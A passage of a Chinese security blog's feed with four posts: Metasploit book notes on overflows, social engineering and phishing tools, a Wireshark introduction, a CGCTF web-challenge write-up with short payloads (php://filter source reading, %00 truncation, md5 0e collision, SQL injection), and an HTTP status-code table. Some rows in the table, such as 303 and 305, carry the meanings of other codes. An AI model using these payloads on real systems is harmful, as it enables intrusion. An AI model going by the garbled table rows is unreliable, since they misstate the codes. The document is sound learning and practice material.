overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。<br>根据溢出内存位置不同，缓冲区溢出分为栈溢出和堆溢出。</p><p><b>栈溢出：</b><br>栈溢出指当写入数据超过内存分配给栈的缓冲区空间。会导致覆盖缓冲区附近的变量从而改变程序流程和结果；或是覆盖保存的函数地址修改为指定的地址；还有可能覆盖掉某个指针或者程序异常处理结构。<br>覆盖返回地址的利用方式是在函数进行调用时覆盖掉函数返回指针所指向的地址，从而达到调用shellcode的目的；<br>覆盖异常处理的利用方式</p><h3><b>第六章</b></h3><p>第六章讲述的是客户端的渗透攻击。包含了常用的客户端软件如：浏览器、office、Adobe等。<br>主要的漏洞有：MS11-050、MS10-087。</p><p>同第五章，这一部分在开始学习逆向之后补齐。</p><h3><b>第七章</b></h3><p>第七章讲社工，这一部分还是蛮有意思的。<br>说到社工，就不得不提凯文.米特尼克...和《欺骗的艺术》(虽然到现在我还没有看过，近期补上)。还有一本人性的弱点。</p><p>讲道理社工是一门博大精深的学问，个人觉得可以通过一些逻辑小游戏或者海龟汤故事之类的锻炼叙述一个故事或情景模拟。</p><p>从原理上来说，社会工程学（Social Engineering），是一种通过人际交流的方式获得信息的非技术渗透手段。他利用对象的心理弱点、人类的本能反应和好奇心等心理特征，进行欺骗、冒充、引诱等多种手段达成目的。</p><p>社工最重要的还是在进行之前的信息搜集。你能取得越多的信息，对于你获取信任的可能性就越大。</p><p>书中描述了一个社会工程学的环节框架：</p><p>1.信息搜集<br>2.诱导<br>3.托词<br>4.心理影响</p><p>在PC端对社工能够起到帮助的有：网络电话、木马、钓鱼网站的伪造、U盘攻击等等。</p><p><b>网络电话</b></p><p><b>木马</b><br>msfpayload</p><p><b>钓鱼</b><br>set工具</p><p><b>U盘攻击</b><br>autorun.inf<br>UItraISO<br>Hacksaw<br>Switchblade</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Metasploit渗透测试魔鬼训练营渗透笔记&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2019-1-30&lt;/small&gt;&lt;/center&gt;
&lt;p&gt;日常写点什么&lt;br&gt;
寒假开始一周多，想把这本搞了快半年的书彻底的读完。&lt;br&gt;
写一个小总结似的笔记，把书里的课</summary>
      
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="笔记" scheme="http://blog.dvkunion.cn/tags/笔记/"/>
    
    <category term="渗透测试" scheme="http://blog.dvkunion.cn/tags/渗透测试/"/>
    
  </entry>
  
  <entry>
    <title>WireShark</title>
    <link href="http://blog.dvkunion.cn/2019/01/27/WireShark/"/>
    <id>http://blog.dvkunion.cn/2019/01/27/WireShark/</id>
    <published>2019-01-27T06:43:03.000Z</published>
    <updated>2019-05-24T16:11:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1>WireShark</h1><h3><b>0x00- - 前言<b></b></b></h3><p>从头开始，巩固基础。<br>开始痛苦的补地基之旅。</p><h3><b>0x01- - WireShark简介<b></b></b></h3><p>常规，了解wireshark是什么。</p><p>参考官网介绍（卡的一批，挂梯子会好一点），&quot;Wireshark network protocol analyzer&quot;--网络协议分析器，其功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。是由前Ethereal团队开发的开源项目。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。</p><p>WireShark的抓包一般包含三种：本机、集线器、交换机。</p><p>本机环境的抓包是最常用也是较简单的一种方式：wireshark作为本机和网卡之间的代理，在网络交换时抓取数据并呈交给网卡或主机。<br>集线器环境：根据集线器的UDP特性直接可以接收到其他网络主机发送的消息。<br>交换机环境：</p><ul><li>1.让交换机设置SPAN--端口镜像，进行流量的转发和引流。</li><li>2.ARP欺骗:没有交换机权限，使用 Cain&amp;Abel ARP攻击软件对局域网进行欺骗回复来获得流量。</li><li>3.mac泛供:爆交换机的路由表。</li></ul><p>一开始对于这个工具，其实我是拒绝的。<br>毕竟burp来抓包改包方便的多。<br>就是我的burp没安证书稍微有一丢丢麻烦orz。。。</p><p>简单的对比了一下这两个工具（据说还有一个比较常用的Fiddler，没有接触过，等用熟悉了以后尝试一下<br>）总而言之，Burp更倾向于简单的http/https请求包的分析，使用的是Java语言，其爆破和爬虫等附加功能也很强大，更倾向于是一个多功能集合体武器。</p><p>相对而言的WireShark，更多的倾向于网络传输中每一帧，每一个动作，他都会记录下来。WireShark不仅仅可以捕获http/https协议的数据包，TCP/UDP等常见的协议数据包都能够捕获。更倾向于一台记录仪，把你每一个细微的动作都记录下来。<br>在Wireshark官网上有一句：Sniff free or die。所以Wireshark其实更多的是一个Sniff--嗅探工具，而不是一个抓包工具。</p><p>WireShark多用于内网渗透和流量分析。</p><p>WireShark官网：<a href="https://www.wireshark.org/" target="_blank" rel="noopener">https://www.wireshark.org/</a><br>WireShark官方Wiki:<a href="https://wiki.wireshark.org/" target="_blank" rel="noopener">https://wiki.wireshark.org/</a></p><h3><b>0x02- - WireShark基础<b></b></b></h3><p>首先是安装：Kali2.0内自带wireshark，同样也可以到官网下载对应版本安装即可。<br>记得勾选好插件，并安装抓包驱动。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;WireShark&lt;/h1&gt;
&lt;h3&gt;&lt;b&gt;0x00- - 前言&lt;b&gt;&lt;/b&gt;&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;从头开始，巩固基础。&lt;br&gt;
开始痛苦的补地基之旅。&lt;/p&gt;
&lt;h3&gt;&lt;b&gt;0x01- - WireShark简介&lt;b&gt;&lt;/b&gt;&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;常规，了解wi</summary>
      
    
    
    
    <category term="Tools" scheme="http://blog.dvkunion.cn/categories/Tools/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WEB" scheme="http://blog.dvkunion.cn/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>CGCTF</title>
    <link href="http://blog.dvkunion.cn/2019/01/21/CGCTF/"/>
    <id>http://blog.dvkunion.cn/2019/01/21/CGCTF/</id>
    <published>2019-01-21T06:51:53.000Z</published>
    <updated>2019-06-14T03:41:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1>CGCTF</h1><h3><b>0x00- - 前言</b></h3><p>寒假也开始刷题了...从简单的南邮大佬开始刷起吧...</p><h3><b>0x01- - WEB</b></h3><p><b> 001 签到题</b></p><p>页面询问 key在哪里 打开F12 html注释里得到flag</p><p><b> 002 md5 collision </b></p><p>明显的弱等于和md5 0e科学计数法漏洞<br>放一个payload :s1885207154a</p><p><b> 003 签到2</b></p><p>要求输入一个口令，却发现输入框限制比要求的少了一位，F12改maxlength即可</p><p><b> 004 这题不是WEB</b></p><p>找了一圈啥也没找到，最后下载那个动图扔HEX，图片最后即得Flag</p><p><b> 005 层层递进 </b></p><p>最喜欢的就是这道题<br>Bp爬一下这个题目，会发现四个页面，flag就隐藏在404页面的大段注释的js代码（藏头）</p><p><b> 006 AAencode</b></p><p>题目名字直接告诉你了，扔AAdecode解码即可<br><a href="https://tool.zcmzcm.org/aadecode" target="_blank" rel="noopener">https://tool.zcmzcm.org/aadecode</a><br>有个问题是浏览器打开好像乱码了，需要直接下载txt打开。<br>顺带一提chrome控制台可以直接解码...</p><p><b> 007 单身20年</b></p><p>Bp抓包查看302页面即可</p><p><b> 010 php decode</b></p><p>放出了源码，本地跑一下就行。<br>eval函数好像不起作用，换成echo就好了</p><p><b> 011 文件包含 </b></p><p>本地文件上传漏洞,点击之后明显的看到url：?file=show.php<br>构造payload直接查看index.php源码即得flag<br>payload:file=php://filter/read=convert.base64-encode/resource=./index.php<br>读出源码base64解密</p><p><b>012 单身一百年也没用(感受出题人的恶意..)</b></p><p>依旧抓包<br>key藏在了302页面响应头中</p><p><b> 013 Download~ !</b></p><p>题目打不开了。。。。</p><p><b> 014 Cookie </b></p><p>hint给的很足，抓包直接将cookie改为1即可</p><p><b> 015 MYSQL  </b></p><p>现根据提示进入robots.txt看到源码</p><p>可以明显的看到用意：flag存在id=1024内但是输入的id不能是1024</p><p>看到intval函数</p><p>小数绕过即可</p><p><b> 016 GBK Injection </b></p><p>宽字节注入，这题还没搞懂。</p><p><b> 017 /x00 </b></p><p>明显的%00截断...数组也可以绕过<br>数组绕过的是strops函数，而%00是绕过了ereg函数<br>正常payload:nctf=1%00%23biubiubiu</p><p><b> 020 bypass again </b></p><p>弱类型 ==</p><p><b> 021 变量覆盖 </b></p><p>这题也没有做出来，思考的方向错了。<br>看了别人的题解，post提交后覆盖掉$thepassword_123即可。</p><p><b> 022 PHP是世界上最好的语言  </b></p><p>也挂掉了...</p><p><b> 023 伪装者</b></p><p>以为是改X-forwarded-for，结果没用</p><p><b> 024 Header </b></p><p>F12查看head...</p><p><b> 025 上传绕过</b></p><p>要求上传php但是只能上传图片格式文件<br>BP抓包改hex 使用00截断</p><p><b> 026 SQL注入1</b></p><p>直接查看了源码，sql查询语句：<br>$sql=&quot;select user from ctf where (user='&quot;.$user.&quot;') and (pw='&quot;.$pass.&quot;')&quot;;<br>这里犯了一个错误...没有使用)将语句封闭，导致一直报错。<br>还有个奇怪的地方</p><p><b> 027 pass check </b></p><p>源码给出，要求过掉strcmp函数<br>数组直接过掉</p><p><b> 030 起名字真难 </b></p><p>同样给出源码<br>要求一个key，key的每一个数字的值的acsii不能大于等于1小于等于9，并且要求key = '54975581388'</p><p>依旧是弱类型，==会把两个变量转换为相同的类型再进行比较</p><p><b> 031 密码重置</b></p><p>一开始以为是get和post的覆盖。。。直接把用户名改为admin 的base64重发就OK了</p><p><b> 032 php 反序列化(暂时无法做) </b></p><p>无题目。</p><p><b> 033 SQL Injection </b></p><p>打开只有Invalid password!</p><p>F12查看页面源码找到提示：使用admin登录</p><p><b> 034 综合题</b></p><p>打开一堆fuckjs，扔console给出了一个页面<br>页面提示tips在脑子里，脑子=head<br>查看head,tips：history of bash<br>Linux下history命令会生成.bash_history文件，<br>查看发现存在一个flagbak的Zip，访问下载，解压得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CGCTF&lt;/h1&gt;
&lt;h3&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;寒假也开始刷题了...从简单的南邮大佬开始刷起吧...&lt;/p&gt;
&lt;h3&gt;&lt;b&gt;0x01- - WEB&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;&lt;b&gt; 001 签到题&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;页面询问 key在</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP状态码</title>
    <link href="http://blog.dvkunion.cn/2019/01/17/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>http://blog.dvkunion.cn/2019/01/17/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/</id>
    <published>2019-01-17T13:28:48.000Z</published>
    <updated>2019-05-24T16:11:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1>HTTP状态码</h1><h3><b>0x00- - 概念</b></h3><p>HTTP状态码（英语：HTTP Status Code）是用以表示网页服务器超文本传输协议响应状态的3位数字代码。这是表示使用HTTP协议（HyperText Transfer Protocol，超文本传输协议）客服端的请求做出反应的三位数字码。<br>HTTP状态根据开头的第一个数字分为5类。后面两个数字没有分类的作用。</p><h3><b>0x01- - 1xx 信息类状态码</b></h3><p>这类状态码表示服务器已经收到了请求，需要请求者继续执行操作。</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switch Protrol</td><td>切换协议，根据客户端的请求切换协议，只能由下至上的切换</td></tr><tr><td>102</td><td>Processing</td><td>由WebDAV（RFC 2518）扩展的状态码，代表处理将被继续执行</td></tr></tbody></table><h3><b>0x02- - 2xx 成功类状态码</b></h3><p>这类状态码表示服务器已经接受了请求并成功地处理了请求</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成,如果201所处理的请求无法及时建立，则返回该状态码</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>请非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求,类似迅雷等下载工具的下载大文件方式</td></tr><tr><td>207</td><td>Multi-Status</td><td>由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</td></tr></tbody></table><p>206请求头部必须包含Range头信息，并有可能含有IF-Range作为条件请求。<br>响应必须包含如下的头部域：<br>　　Content-Range 用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart/byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。<br>　　Date<br>　　ETag 和/或 Content-Location，假如同样的请求本应该返回200响应。<br>　　Expires, Cache-Control，和/或 Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。<br>　　假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。<br>　　假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。<br>　　任何不支持 Range 以及 Content-Range 头的缓存都禁止缓存206响应返回的内容。</p><h3><b>0x03- - 3xx 重定向类状态码</b></h3><p>这类状态码表示服务器需要进一步操作来完成请求。<br>用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A-&gt;A，或者A-&gt;B-&gt;C-&gt;A），因为这会导致服务器和客户端大量不必要的资源消耗。按照 HTTP/1.0 版规范的建议，浏览器不应自动访问超过5次的重定向。</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替。如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>请非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr></tbody></table><h3><b>0x04- - 4xx 外部错误类状态码</b></h3><p>这类状态码通常指客户端发送的发生了错误，妨碍了服务器的处理、请求包含语法错误或无法完成请求。</p><h3><b>0x05- - 5xx 内部错误类状态码</b></h3><p>这类状态码通常指服务器在处理请求的过程出现了错误或者有异常发生。也可能是服务器意识到无法处理这个请求。<br>5xx的状态码适用于任何响应方法。</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求，一般是服务器代码出现问题</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr><tr><td>506</td><td>Variant Also Negotiates</td><td>由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误</td></tr><tr><td>507</td><td>Insufficient Storage</td><td>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918)</td></tr><tr><td>509</td><td>Bandwidth Limit Exceeded</td><td>服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。</td></tr><tr><td>510</td><td>Not Extended</td><td>获取资源所需要的策略并没有没满足。（RFC 2774）</td></tr></tbody></table><h3><b>0x06- - 其他状态码</b></h3><p>208 已经报告<br>一个DAV的绑定成员被前一个请求枚举，并且没有被再一次包括。</p><p>226 IM Used<br>服务器已经满足了请求所要的资源，并且响应是一个或者多个实例操作应用于当前实例的结果。</p><p>308 永久转移<br>这个请求和以后的请求都应该被另一个URI地址重新发送。307、308和302、301有相同的表现，但是不允许HTTP方法改变。例如，请求表单到一个永久转移的资源将会继续顺利地执行。</p><p>418 我是一个茶壶<br>这个代码是在1998年作为传统的IETF April Fools‘ jokes被定义的在RFC2324，超文本咖啡罐控制协议，但是并没有被实际的HTTP服务器实现。RFC指定了这个代码应该是由茶罐返回给速溶咖啡。</p><p>419 认证超时<br>并不是HTTP标注的一部分，419认证超时表示以前的有效证明已经失效了。同时也被用于401未认证的替代选择为了从其它被拒绝访问的已认证客户端中指定服务器的资源。</p><p>420 方法失效<br>不是HTTP的标准，但是被Spring定义在HTTP状态类中当方法失时使用。这个状态码已经不推荐在Spring中使用。</p><p>420 提高你的耐心<br>也不是HTTP标准的一部分，但是被版本1的Twitter搜索和趋势APi返回当客户端的速率被限制的时候。其它的服务提供商可能会使用429太多的请求响应码来代替。</p><p>428 需要前置条件<br>原始服务器需要有条件的请求。当客户端GET一个资源的状态的时候，同时又PUT回给服务器，与此同时第三方修改状态到服务器上的时候，为了避免丢失更新的问题发生将会导致冲突。</p><p>429 过多请求<br>用户已经发送了太多的请求在指定的时间里。用于限制速率。</p><p>431 请求头部字段太大<br>服务器由于一个单独的请求头部字段或者是全部的字段太大而不愿意处理请求。</p><p>440 登陆超时（微软）<br>一个微软的扩展，意味着你的会话已经超时。</p><p>444 无响应<br>被使用在Nginx的日志中表明服务器没有返回信息给客户端并且关闭了连接（在威慑恶意软件的时候比较有用）。</p><p>449 重试（微软）<br>一个微软的扩展。请求应该在执行适当的动作之后被重试。</p><p>450 被Windows家长控制阻塞（微软）<br>一个微软的扩展。这个错误是当Windows家长控制打开并且阻塞指定网页的访问的时候被指定。</p><p>451 由于法律原因而无效（因特网草稿）<br>被定义在因特网草稿“一个新的HTTP状态码用于法律限制的资源”。被用于当资源的访问由于法律原因被禁止的时候。例如检查制度或者是政府强制要求禁止访问。一个例子是1953年dystopian的小说Fahrenheit 451就是一个非法的资源。</p><p>451 重定向（微软）<br>被用在Exchange ActiveSync中如果一个更有效的服务器能够被使用或者是服务器不能访问用户的邮箱。</p><p>客户端会假定重新执行HTTP自动发现协议去寻找更适合的服务器。</p><p>494 请求头太大（Nginx）<br>Nginx内置代码和431类似，但是是被更早地引入在版本0.9.4（在2011年1月21日）。</p><p>495 证书错误（Nginx）</p><p>Nginx内置的代码，当使用SSL客户端证书的时候错误会出现为了在日志错误中区分它和4XX和一个错误页面的重定向。。</p><p>496 没有证书（Nginx）<br>Nginx内置的代码，当客户端不能提供证书在日志中分辨4XX和一个错误页面的重定向。</p><p>497 HTTP到HTTPS（Nginx）<br>Nginx内置的代码，被用于原始的HTTP的请求发送给HTTPS端口去分辨4XX在日志中和一个错误页面的重定向。</p><p>498 令牌超时或失效（Esri）<br>由ArcGIS for Server返回。这个代码意味着令牌的超时或者是失效。</p><p>499 客户端关闭请求（Nginx）<br>被用在Nginx日志去表明一个连接已经被客户端关闭当服务器仍然正在处理它的请求，是的服务器无法返货状态码。</p><p>499 需要令牌（Esri）<br>由ArcGIS for Server返回。意味着需要一个令牌（如果没有令牌被提交）。</p><p>508 发现环路<br>服务器发现了一个无限的循环档处理请求的时候。</p><p>511 需要网络授权<br>客户端需要授权去火的网络的访问权限。一般用于代理交互中被用来进行网络的访问控制。</p><p>520 未知错误<br>这个状态码也没有被指定在任何RFC中，并且只会被一些服务器返回，例如微软的Azure和CloudFlare服务器:”520错误本质上是一个捕获全部的响应当原始服务器返回一些未知的或者一些不能被忍受或者被解释的(协议违反或者空响应)”。</p><p>598 网络读取超时异常(未知)<br>这个状态码也没有在任何RFC中指定，但是被用在微软的HTTP代理中去标注一个网络读取超时在一个客户端之前的代理的后面。</p><p>599 网络连接超时异常(未知)<br>这个状态码也没有在任何RFC中指定，但是被用在微软的HTTP代理中去标注一个网络连接超时在一个客户端之前的代理的后面。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;HTTP状态码&lt;/h1&gt;
&lt;h3&gt;&lt;b&gt;0x00- - 概念&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;HTTP状态码（英语：HTTP Status Code）是用以表示网页服务器超文本传输协议响应状态的3位数字代码。这是表示使用HTTP协议（HyperText Transfer Prot</summary>
      
    
    
    
    <category term="Crypto" scheme="http://blog.dvkunion.cn/categories/Crypto/"/>
    
    
    <category term="WEB" scheme="http://blog.dvkunion.cn/tags/WEB/"/>
    
    <category term="常用编码" scheme="http://blog.dvkunion.cn/tags/常用编码/"/>
    
  </entry>
  
</feed>
